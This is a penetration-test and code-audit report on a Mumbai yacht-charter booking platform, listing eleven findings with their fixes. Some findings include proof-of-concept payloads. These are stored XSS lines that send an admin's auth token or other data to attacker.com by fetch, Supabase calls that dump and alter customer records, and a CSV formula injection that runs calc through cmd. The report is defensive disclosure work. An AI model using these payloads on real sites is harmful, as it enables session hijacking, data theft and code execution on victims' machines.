# BLACK PEARL · LADY ALICE
# FULL APPLICATION SECURITY AUDIT & PENETRATION TESTING REPORT

**Classification**: Confidential / Application Security Audit  
**Date**: October 19, 2026  
**Auditor**: Senior Application Security Engineer & DevSecOps Specialist  
**Application**: Black Pearl · Lady Alice (Mumbai Luxury Private Ship Charter Platform)  
**Target URL**: `https://blackpearlmumbai.com` / Local Port `3000`  
**Repository**: `/Users/rehanshafiq/Desktop/Synex/Synex Projects /Blackpearl`  

---

## 1. EXECUTIVE SUMMARY

An exhaustive application security assessment, code audit, penetration test, and cryptographic evaluation was performed on the **Black Pearl · Lady Alice** web platform. The platform handles sensitive customer personally identifiable information (PII), luxury charter scheduling, online deposit payments via Razorpay, administrative command deck access, and physical dock boarding verification via digital QR passes.

### Key Assessment Findings
* **Total Discovered Vulnerabilities**: **11**
  * **Critical**: **3** (Overly Permissive RLS exposing customer PII; Stored XSS in Admin Portal; Stored XSS via Public Gallery Insertion)
  * **High**: **2** (Missing Admin Verification RPC check in frontend UI shell; Unthrottled order creation DoS / calendar slot hoarding)
  * **Medium**: **3** (Spreadsheet formula injection in CSV export; Total absence of HTTP security headers & clickjacking protection; Excessive customer PII exposure in boarding QR verification)
  * **Low**: **2** (Unbounded request body buffering in serverless runtime; Public read access to traffic analytics)
  * **Informational**: **1** (Deprecated prototype booking modal code in `main.js`)

### Critical Security Strengths
1. **Cryptographic Payment Integrity**: Razorpay HMAC-SHA256 signature verification is implemented using constant-time comparison (`crypto.timingSafeEqual`) on both direct checkout verification (`/api/verify-payment`) and raw-body webhooks (`/api/razorpay-webhook`). Server-side pricing enforcement prevents client-side price or deposit manipulation.
2. **Database Concurrency Protection**: The PostgreSQL `holds_paid_no_overlap` constraint (using `btree_gist` exclusion) mathematically prevents overlapping paid charters and enforces an automatic 1-hour turnaround buffer. Race conditions between concurrent checkouts are handled gracefully.
3. **Clean Dependency Tree**: `npm audit` returned 0 vulnerabilities across all 106 dependencies. Zero hardcoded server secrets or live API keys were discovered in the repository or bundled into production distribution assets.

### Release-Readiness Decision
**STATUS: NOT READY**  
Due to the presence of **3 Critical vulnerabilities** and **2 High vulnerabilities**—specifically allowing anonymous internet users to read all private customer voyage briefs (names, phone numbers, notes) and execute Stored XSS attacks against administrators—the application **cannot be approved for production release** until all Priority 0 (P0) remediation actions are applied.

---

## 2. SCOPE AND METHODOLOGY

### Scope
* **Frontend Modules**: Landing Page (`/`), Dedicated Booking Engine (`/book`), Admin Command Deck (`/admin`), Gallery (`/gallery`), About (`/about`), Contact (`/contact`), Verification (`/verify`), and Legal Suites (`/terms`, `/privacy`, `/cancellation`).
* **Backend Serverless APIs** (`/api`): `create-order.js`, `verify-payment.js`, `availability.js`, `booking.js`, `payment-failed.js`, `qr.js`, `razorpay-webhook.js`.
* **Database & Auth (Supabase / PostgreSQL)**: `holds`, `admin_users`, `blocked_dates`, `voyage_briefs`, `contact_inquiries`, `community_members`, `gallery_images`, `page_views`, `admin_activity`, SQL functions (`public.is_admin()`), constraints, and RLS policies.
* **Integrations**: Razorpay Payment Gateway, Resend Email Service, ImageKit Media Delivery.
* **Configurations**: `package.json`, `package-lock.json`, `vite.config.js`, `vercel.json`, `.gitignore`, `.env.example`.

### Methodology Standards
* **OWASP Top 10 for Web Applications (2021)**
* **OWASP API Security Top 10 (2023)**
* **Common Vulnerability Scoring System (CVSS) v4.0**
* **NIST SP 800-115** (Technical Guide to Information Security Testing and Assessment)

---

## 3. DETAILED VULNERABILITY FINDINGS

### BP-SEC-01: Overly Permissive RLS on `voyage_briefs` Exposes Customer PII to Public Read and Tampering
* **Severity**: **CRITICAL**
* **CVSS 4.0 Score**: **8.7** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`)
* **OWASP Category**: A01:2021 — Broken Access Control / API1:2023 — Broken Object Level Authorization
* **Affected Component**: `supabase_schema.sql` (lines 118–129), `public.voyage_briefs` table.
* **Root Cause**:
  In `supabase_schema.sql`, while `holds`, `community_members`, and `contact_inquiries` were locked down to administrators using `public.is_admin()`, the `voyage_briefs` table retains the legacy policy:
  ```sql
  CREATE POLICY "Public can view voyage briefs"
  ON public.voyage_briefs FOR SELECT
  TO anon, authenticated
  USING (true);

  CREATE POLICY "Public can update voyage briefs"
  ON public.voyage_briefs FOR UPDATE
  TO anon, authenticated
  USING (true)
  WITH CHECK (true);
  ```
* **Attack Proof of Concept**:
  Any unauthenticated user with the public Supabase anon key can run:
  ```javascript
  const { data } = await supabase.from('voyage_briefs').select('*');
  console.log(data); // Dumps all customer names, phone numbers, budgets, and private notes
  await supabase.from('voyage_briefs').update({ status: 'Cancelled' }).neq('id', '00000000-0000-0000-0000-000000000000');
  ```
* **Impact**: Total compromise of customer confidentiality and data integrity. Allows competitors or malicious actors to harvest high-net-worth charter customer leads and tamper with voyage inquiries.
* **Remediation**: Drop public SELECT and UPDATE policies; restrict them strictly to `public.is_admin()`.

---

### BP-SEC-02: Stored Cross-Site Scripting (XSS) in Admin Portal via Unescaped Voyage Briefs Table Rendering
* **Severity**: **CRITICAL**
* **CVSS 4.0 Score**: **8.5** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N`)
* **OWASP Category**: A03:2021 — Injection
* **Affected Component**: [admin/admin.js](file:///Users/rehanshafiq/Desktop/Synex/Synex%20Projects%20/Blackpearl/admin/admin.js#L970-L985) (`renderInquiriesTable`).
* **Root Cause**:
  In `admin.js`, when rendering incoming voyage briefs, user-supplied fields (`brief.name`, `brief.phone`, `brief.occasion`, `brief.notes`) are directly concatenated into `tr.innerHTML` without sanitization or wrapping in `escapeHtml()`:
  ```javascript
  tr.innerHTML = `
    <td class="font-medium"><strong>${brief.name || 'Private Client'}</strong></td>
    <td><span class="occasion-tag">${brief.occasion || 'Custom'}</span></td>
    <td class="notes-cell" title="${brief.notes || 'None'}">${brief.notes ? ... : '—'}</td>
  `;
  ```
* **Attack Proof of Concept**:
  An attacker submits a voyage brief on the public website with:
  ```html
  name: <img src=x onerror="fetch('https://attacker.com/steal?jwt='+localStorage.getItem('sb-xyzcompany-auth-token'))">
  ```
  When the administrator opens the "Voyage Briefs" tab in the command deck, the script automatically executes, stealing the admin's Supabase authentication token and granting the attacker full administrative access.
* **Impact**: Administrative account takeover, full database access, unauthorized cancellation of charters, and exposure of all customer records.
* **Remediation**: Wrap all interpolated brief fields with `escapeHtml(brief.field || '')`.

---

### BP-SEC-03: Stored Cross-Site Scripting (XSS) via Public Gallery Insertion and Unescaped Homepage Rendering
* **Severity**: **CRITICAL**
* **CVSS 4.0 Score**: **8.6** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`)
* **OWASP Category**: A03:2021 — Injection / A01:2021 — Broken Access Control
* **Affected Component**: `supabase_schema.sql` (line 151), [main.js](file:///Users/rehanshafiq/Desktop/Synex/Synex%20Projects%20/Blackpearl/main.js#L1580-L1590) (`renderDynamicGalleryImages`), [admin/admin.js](file:///Users/rehanshafiq/Desktop/Synex/Synex%20Projects%20/Blackpearl/admin/admin.js#L1369-L1370) (`renderMediaGrid`).
* **Root Cause**:
  1. `public.gallery_images` has an RLS policy granting public insertion:
     ```sql
     CREATE POLICY "Public can insert gallery images" ON public.gallery_images FOR INSERT TO anon, authenticated WITH CHECK (true);
     ```
  2. `main.js` queries `gallery_images` on page load and injects `img.title` and `img.subtitle` directly into `item.innerHTML` with no escaping:
     ```javascript
     item.innerHTML = `
       <img src="${thumbUrl}" alt="${img.title}" loading="lazy">
       <div class="gallery-overlay">
         <h4 class="overlay-title">${img.title}</h4>
         <p class="overlay-desc">${img.subtitle || 'Private charter on Lady Alice'}</p>
     `;
     ```
* **Attack Proof of Concept**:
  An attacker executes a direct insert via the Supabase client:
  ```javascript
  await supabase.from('gallery_images').insert([{
    title: `<svg/onload=fetch('https://attacker.com/xss')>`,
    subtitle: 'Defaced',
    category: 'sailing',
    imagekit_url: 'https://ik.imagekit.io/mock/yacht.jpg'
  }]);
  ```
  The payload executes on every single visitor visiting `https://blackpearlmumbai.com/` as well as any administrator viewing the media manager.
* **Impact**: Universal client-side compromise of all website visitors (drive-by malware redirection, phishing, defacement).
* **Remediation**: Restrict `gallery_images` insertion to `public.is_admin()`, and apply strict HTML escaping in `renderDynamicGalleryImages` and `renderMediaGrid`.

---

### BP-SEC-04: Lack of Server-Side Authorization Verification (`is_admin()`) in Admin Frontend UI Shell
* **Severity**: **HIGH**
* **CVSS 4.0 Score**: **7.1** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N`)
* **OWASP Category**: A01:2021 — Broken Access Control
* **Affected Component**: [admin/admin.js](file:///Users/rehanshafiq/Desktop/Synex/Synex%20Projects%20/Blackpearl/admin/admin.js#L331-L355) (`initAuthHandlers`, `checkSessionAndRoute`).
* **Root Cause**:
  The admin portal allows arbitrary email registration via `signUpAdmin(email, password)`. Once authenticated as any valid Supabase user, `admin.js` directly invokes `showPortalScreen()` and `navigateTo('dashboard')` without verifying whether `supabase.rpc('is_admin')` returns `true`.
* **Impact**: While RLS prevents unauthorized users from reading `holds` and `contact_inquiries`, unauthorized users are presented with the administrative dashboard, can read `voyage_briefs` (due to BP-SEC-01), view media assets, and trigger client-side errors.
* **Remediation**: Call `const { data: isAdmin } = await supabase.rpc('is_admin')` prior to rendering the admin portal; immediately sign out unauthorized accounts.

---

### BP-SEC-05: Unrestricted Resource Consumption and DoS via Unthrottled Order Creation (`/api/create-order`)
* **Severity**: **HIGH**
* **CVSS 4.0 Score**: **7.5** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`)
* **OWASP Category**: API4:2023 — Unrestricted Resource Consumption / API6:2023 — Unrestricted Access to Sensitive Business Flows
* **Affected Component**: [api/create-order.js](file:///Users/rehanshafiq/Desktop/Synex/Synex%20Projects%20/Blackpearl/api/create-order.js#L45-L154).
* **Root Cause**:
  `/api/create-order` creates a Razorpay order and inserts a `Payment Pending` hold into Supabase. In `api/_lib/occupancy.js`, pending checkouts block their time slot for 15 minutes (`PENDING_HOLD_MINUTES = 15`). Because the endpoint has no rate limiting or CAPTCHA, an automated loop can generate orders across all upcoming dates.
* **Impact**: Denial of Service (DoS) on the booking calendar; legitimate guests cannot reserve dates; exhaustion of Razorpay API rate limits.
* **Remediation**: Implement IP-based rate limiting (maximum 5 orders per 10 minutes) and require Cloudflare Turnstile or Google reCAPTCHA v3.

---

### BP-SEC-06: Spreadsheet Formula Injection (CSV Injection) in Admin Community Member Export
* **Severity**: **MEDIUM**
* **CVSS 4.0 Score**: **6.5** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N`)
* **OWASP Category**: A03:2021 — Injection (CWE-1236)
* **Affected Component**: [admin/admin.js](file:///Users/rehanshafiq/Desktop/Synex/Synex%20Projects%20/Blackpearl/admin/admin.js#L1128-L1136).
* **Root Cause**:
  `csvCell` only escapes double quotes (`replace(/"/g, '""')`) but does not neutralize formula trigger characters (`=`, `+`, `-`, `@`, `\t`, `\r`).
* **Attack Proof of Concept**:
  A visitor signs up for the WhatsApp community with:
  ```
  Name: =cmd|' /C calc'!A0
  ```
  When the administrator exports the CSV and opens it in Microsoft Excel, the formula executes.
* **Impact**: Remote code execution or local data exfiltration on the administrator's workstation.
* **Remediation**: Prepend an apostrophe (`'`) to any cell value beginning with `=`, `+`, `-`, `@`, `\t`, or `\r`.

---

### BP-SEC-07: Complete Absence of HTTP Security Headers (CSP, HSTS, Clickjacking Protection)
* **Severity**: **MEDIUM**
* **CVSS 4.0 Score**: **5.3** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N`)
* **OWASP Category**: A05:2021 — Security Misconfiguration
* **Affected Component**: [vercel.json](file:///Users/rehanshafiq/Desktop/Synex/Synex%20Projects%20/Blackpearl/vercel.json).
* **Root Cause**: `vercel.json` contains route rewrites but lacks a `headers` definition.
* **Impact**: Missing `X-Frame-Options` allows clickjacking attacks against the booking engine and admin portal. Missing `Content-Security-Policy` allows arbitrary script injection. Missing `Strict-Transport-Security` allows man-in-the-middle downgrade attacks.
* **Remediation**: Add a standard production headers block in `vercel.json`.

---

### BP-SEC-08: Excessive Data Exposure in Boarding Pass Verification API (`/api/booking`)
* **Severity**: **MEDIUM**
* **CVSS 4.0 Score**: **4.3** (`CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`)
* **OWASP Category**: API3:2023 — Broken Object Property Level Authorization
* **Affected Component**: [api/_lib/booking.js](file:///Users/rehanshafiq/Desktop/Synex/Synex%20Projects%20/Blackpearl/api/_lib/booking.js#L117-L137) (`toPublicBooking`).
* **Root Cause**: When a physical QR boarding pass is scanned on the pier by dock staff, `/api/booking` returns `phone`, `email`, and `notes`.
* **Impact**: Unnecessary disclosure of passenger personal contact details and private notes to third-party dock attendants or anyone scanning the physical pass.
* **Remediation**: Remove `phone`, `email`, and `notes` from `toPublicBooking`.

---

### BP-SEC-09: Unrestricted HTTP Request Body Buffering in Serverless Functions
* **Severity**: **LOW**
* **CVSS 4.0 Score**: **3.7** (`CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`)
* **OWASP Category**: API4:2023 — Unrestricted Resource Consumption
* **Affected Component**: [api/_lib/http.js](file:///Users/rehanshafiq/Desktop/Synex/Synex%20Projects%20/Blackpearl/api/_lib/http.js#L3-L7) (`readRawBody`).
* **Root Cause**: Streams incoming chunks into an unbounded memory buffer.
* **Impact**: Potential serverless memory exhaustion under high payload volumes.
* **Remediation**: Enforce a 64 KB limit in `readRawBody` and reject oversized streams with HTTP 413.

---

### BP-SEC-10: Public Read Access to Traffic Analytics (`public.page_views`)
* **Severity**: **LOW**
* **CVSS 4.0 Score**: **3.1** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`)
* **OWASP Category**: A01:2021 — Broken Access Control
* **Affected Component**: `supabase_schema.sql` (lines 179–184).
* **Root Cause**: `public.page_views` allows anonymous SELECT to all users.
* **Impact**: Competitors can monitor visitor volume and traffic referrers.
* **Remediation**: Restrict `page_views` SELECT to `public.is_admin()`.

---

### BP-SEC-11: Deprecated Mock Payment Code in `main.js` Bypassing Server API
* **Severity**: **INFORMATIONAL**
* **CVSS 4.0 Score**: **0.0**
* **OWASP Category**: A04:2021 — Insecure Design
* **Affected Component**: [main.js](file:///Users/rehanshafiq/Desktop/Synex/Synex%20Projects%20/Blackpearl/main.js#L851-L863).
* **Root Cause**: Dead prototype code simulates a deposit when `hasRealKey` is false.
* **Impact**: Code confusion. Inactive in production because `openBookingModal` redirects to `/book`.
* **Remediation**: Remove deprecated booking modal functions from `main.js`.

---

## 4. OWASP TOP 10 (2021) EVALUATION MATRIX

| OWASP Category | Evaluation Outcome | Reference Findings |
| :--- | :--- | :--- |
| **A01:2021 — Broken Access Control** | **FAIL** | BP-SEC-01 (voyage_briefs public read/write), BP-SEC-04 (admin UI check missing), BP-SEC-10 (page_views public read) |
| **A02:2021 — Cryptographic Failures** | **PASS** | Razorpay HMAC-SHA256 verified; timingSafeEqual enforced; zero bundled secrets; 192-bit verify tokens |
| **A03:2021 — Injection** | **FAIL** | BP-SEC-02 (Admin stored XSS), BP-SEC-03 (Homepage stored XSS), BP-SEC-06 (CSV injection) |
| **A04:2021 — Insecure Design** | **PARTIAL** | DB exclusion constraint is excellent, but `/api/create-order` lacks anti-hoarding controls (BP-SEC-05) |
| **A05:2021 — Security Misconfiguration** | **FAIL** | BP-SEC-07 (Missing HTTP security headers, CSP, and X-Frame-Options clickjacking protection) |
| **A06:2021 — Vulnerable and Outdated Components**| **PASS** | `npm audit` returned 0 vulnerabilities; lockfile integrity verified |
| **A07:2021 — Identification and Authentication Failures** | **PASS** | Supabase Auth magic link & password flows verified; session persistence configured safely |
| **A08:2021 — Software and Data Integrity Failures** | **PASS** | Webhooks validated against raw body; duplicate payments idempotently handled |
| **A09:2021 — Security Logging and Monitoring Failures** | **PARTIAL** | Payment failures logged, but API endpoints lack centralized security event alerting |
| **A10:2021 — Server-Side Request Forgery (SSRF)** | **PASS** | Zero user-controlled outbound HTTP requests; static endpoints only |

---

## 5. FINAL RELEASE-READINESS DECISION

### Decision: **NOT READY FOR PRODUCTION**

### Justification:
The platform demonstrates outstanding architectural design in payment signature verification, concurrency protection, and database constraints. However, **production sign-off cannot be granted** due to three critical vulnerabilities:
1. **BP-SEC-01**: Complete unauthorized public exposure of all client voyage briefs in Supabase.
2. **BP-SEC-02**: Stored XSS in the admin portal allowing unauthenticated attackers to hijack administrator sessions.
3. **BP-SEC-03**: Anonymous gallery insertion enabling stored XSS across the entire public homepage.

Applying the Priority 0 (P0) remediation actions outlined in [REMEDIATION_PLAN.md](file:///Users/rehanshafiq/Desktop/Synex/Synex%20Projects%20/Blackpearl/security/audit/REMEDIATION_PLAN.md) will resolve all critical blockers and enable security sign-off.
